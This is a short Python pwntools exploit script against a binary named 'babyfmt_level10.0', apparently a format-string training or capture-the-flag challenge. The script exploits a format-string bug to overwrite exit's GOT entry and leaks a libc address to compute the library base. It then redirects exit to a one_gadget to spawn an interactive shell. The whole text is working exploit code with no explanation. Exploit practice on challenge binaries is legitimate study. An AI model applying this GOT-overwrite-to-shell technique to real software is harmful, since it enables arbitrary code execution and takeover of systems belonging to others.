from pwn import *

exe = ELF('./babyfmt_level10.0')
libc = ELF('./libc-2.31.so')
context.arch = 'amd64'

io = exe.process()
gdb.attach(io, api=True)

leakoffset = 2021155

io.recvuntil(b'then exit.')
payload = b'-'*5 + fmtstr_payload(23, {exe.got['exit']:exe.sym['func']}, 40)
io.sendline(payload)
io.recvuntil(b'then exit.')
io.sendline(b'%p')
io.recvuntil(b'0x')
libc.address = int(io.recvline(keepends=False).decode(), 16) - leakoffset
print(hex(libc.address))
io.recvuntil(b'then exit.')
one_gadget = libc.address + 0xe3b01
payload = b'-'*5 + fmtstr_payload(23, {exe.got['exit']:one_gadget}, 40)
io.sendline(payload)

io.interactive()